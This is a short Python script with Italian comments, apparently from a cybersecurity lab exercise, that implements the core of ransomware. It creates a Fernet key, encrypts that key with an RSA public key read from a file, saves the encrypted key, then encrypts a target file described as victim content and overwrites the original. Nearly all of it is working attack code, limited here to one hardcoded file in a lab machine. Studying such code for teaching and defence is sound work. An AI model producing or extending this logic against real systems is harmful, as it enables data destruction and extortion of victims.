# Importazione delle librerie necessarie dal pacchetto 'cryptography':
from cryptography.hazmat.backends import default_backend  # Backend di default per operazioni crittografiche low-level
from cryptography.hazmat.primitives import serialization  # Modulo per serializzazione e deserializzazione di chiavi
from cryptography.hazmat.primitives.asymmetric import padding  # Modulo per specificare il padding (OAEP)
from cryptography.hazmat.primitives import hashes  # Algoritmi di hash (es. SHA256)
from cryptography.fernet import Fernet  # Crittografia simmetrica sicura con Fernet

# (1) Generazione di una chiave simmetrica casuale con l’algoritmo Fernet (AES 128 bit + HMAC)
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)  # Istanza di Fernet con la chiave generata

# (2) Apertura della chiave pubblica da file (usata per crittografare la chiave simmetrica)
with open("/home/osboxes/cybersecurity/008_crypt/ransomware/public_out.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),  # Lettura della chiave pubblica in formato PEM
        backend=default_backend()  # Utilizzo del backend di default
    )

# (3) Crittografia della chiave simmetrica usando la chiave pubblica, con schema OAEP
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,  # Il contenuto da cifrare è la chiave simmetrica
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),  # Mask Generation Function con SHA-256
        algorithm=hashes.SHA256(),  # Algoritmo di hash principale per OAEP
        label=None  # Nessuna etichetta (può essere usata per contesto, opzionale)
    )
)

# (5) Salvataggio su disco della chiave simmetrica cifrata, utile per la successiva decrittazione
with open("encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

# Specifica del percorso del file da cifrare (contenuto vittima)
filePath = "/home/osboxes/cybersecurity/008_crypt/ransomware/FileToEncrypt.txt"

# Apertura e lettura in binario del file da cifrare
with open(filePath, "rb") as file:
    file_data = file.read()

# (6) Cifratura del contenuto del file con l’algoritmo Fernet (usando la chiave simmetrica generata)
encrypted_data = FernetInstance.encrypt(file_data)

# Sovrascrittura del file originale con il contenuto cifrato
with open(filePath, "wb") as file:
    file.write(encrypted_data)

# Terminazione esplicita dello script
quit()
